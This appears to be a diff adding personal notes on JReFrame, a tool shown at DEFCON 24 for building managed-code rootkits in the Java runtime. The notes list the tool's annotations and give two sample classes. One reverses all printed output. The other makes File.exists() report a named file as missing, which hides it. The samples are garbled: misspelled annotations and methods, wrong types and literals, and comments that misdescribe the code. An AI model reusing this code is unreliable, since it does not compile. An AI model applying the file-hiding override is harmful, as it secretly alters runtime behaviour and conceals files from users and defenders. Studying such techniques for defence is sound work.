@@ -1,0 +1,53 @@
+# Project:    Developing Managed Code Rootkit for JRE
+# Resource:   DEFCON 24 - youtube video channel
+# Developer:  Benjamin Holland
+# Location:   https://github.com/JReFramework
+# Released:   Under (MIT License)
+# Designed:   Eclipse (dev and debug)
+### -----NOTES----- ###
+# Annotations type 1
+#   Annotation    Defined               Merge
+#     Type        @DefineType           @MergeType
+#     Method      @DefineMethod         @MergeMethod
+#     Field       @DefineField          N/A
+#     Note        Insert or Replace     Preserves and Replaces
+# 
+# Annotations type 2
+#   Annotation    Visibility                    Finality
+#     Type        @DefineTypeVisibility         @MergeTypeFinality
+#     Method      @DefineMethodVisibility       @MergeMethodFinality
+#     Field       @DefineFieldVisibility        @DefineFieldFinality
+#     Note        Insert or Replace             Preserves and Replaces
+# 
+# 
+### -----CODE BLOCK----- ###
+# extening the public StringBuilder of java.io.PrintStream
+# takes input, reverses the text, prints to user
+@MergeType
+public class BackwardsPrintStream extends java.io.PrintStream {
+  @MergeMEthod
+  @Override
+  public void println(String str){
+    StringBuilder sb = new.StringBuilder(str);
+    super.println(sb.reverse().toString());
+  }
+}
+#
+###-----CODE BLOCK-----### 
+# if file exists - Reply false (merge and override)
+@MergeType
+public class HiddenFile extends java.io.File {
+  @MergeMEthod
+  @Override
+  public Boolean exists() {
+    if(isFile() && getName().equals("YOUR_FILE_NAME")){
+      return False;
+    } else {
+      return super.eists();
+    }
+  }
+}
+#
+#
+#
+#
